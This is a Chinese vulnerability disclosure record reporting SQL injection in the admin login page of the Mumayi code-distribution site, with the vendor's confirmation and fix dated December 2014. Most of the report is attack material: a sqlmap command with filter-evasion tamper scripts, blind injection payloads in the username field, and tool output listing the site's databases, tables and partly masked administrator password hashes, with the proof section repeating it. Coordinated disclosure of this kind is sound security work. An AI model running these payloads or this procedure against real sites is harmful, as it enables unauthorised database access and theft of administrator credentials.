wybug_title: 木蚂蚁应用市场某后台存在SQL注入（得到管理员hash）
wybug_detail:
漏洞详情 披露状态：   									2014-12-13：	细节已通知厂商并且等待厂商处理中									2014-12-15：	厂商已经确认，细节仅向厂商公开									2014-12-25：	细节向核心白帽子及相关领域专家公开									2015-01-04：	细节向普通白帽子公开									2015-01-14：	细节向实习白帽子公开									2015-01-27：	细节向公众公开  简要描述： rt 详细说明：  http://hao.mumayi.cn/   木蚂蚁发号平台http://hao.mumayi.cn/Adminlogin/Login后台用户名存在注入 为thinkphp框架sqlmap -u "http://hao.mumayi.cn/Adminlogin/Login" --data "username=admin&password=test" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py 
Place: POSTParameter: username    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=admin') AND 6550=6550 AND ('CULF'='CULF&password=test    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=admin') AND SLEEP(5) AND ('GUxg'='GUxg&password=test---[15:47:32] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[15:47:32] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11
--dbs
back-end DBMS: MySQL 5.0.11[15:47:57] [INFO] fetching database names[15:47:57] [INFO] fetching number of databases[15:47:57] [INFO] resumed: 3[15:47:57] [INFO] resumed: information_schema[15:47:57] [INFO] resumed: mumayi_hao[15:47:57] [INFO] resumed: testavailable databases [3]:[*] information_schema[*] mumayi_hao[*] test
-D mumayi_hao --tables
Database: mumayi_hao[11 tables]+----------------+| hao_access     || hao_act        || hao_actcode    || hao_activitie  || hao_attention  || hao_game       || hao_node       || hao_role       || hao_role_user  || hao_user       || mumayi_arctype |+----------------+

Table: hao_user[2 entries]+----+-------------+----------------------------------+| id | username    | password                         |+----+-------------+----------------------------------+| 1  | admin       | 43044d787c51f******************* || 2  | mumayiadmin | 43044d787c51f******************* |+----+-------------+----------------------------------+
   漏洞证明：  http://hao.mumayi.cn/   木蚂蚁发号平台http://hao.mumayi.cn/Adminlogin/Login后台用户名存在注入 为thinkphp框架sqlmap -u "http://hao.mumayi.cn/Adminlogin/Login" --data "username=admin&password=test" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py 
Place: POSTParameter: username    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=admin') AND 6550=6550 AND ('CULF'='CULF&password=test    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: username=admin') AND SLEEP(5) AND ('GUxg'='GUxg&password=test---[15:47:32] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[15:47:32] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-12-15 10:39 厂商回复： 技术正在处理，非常感谢 最新状态： 2014-12-15：已经修复完毕，感谢
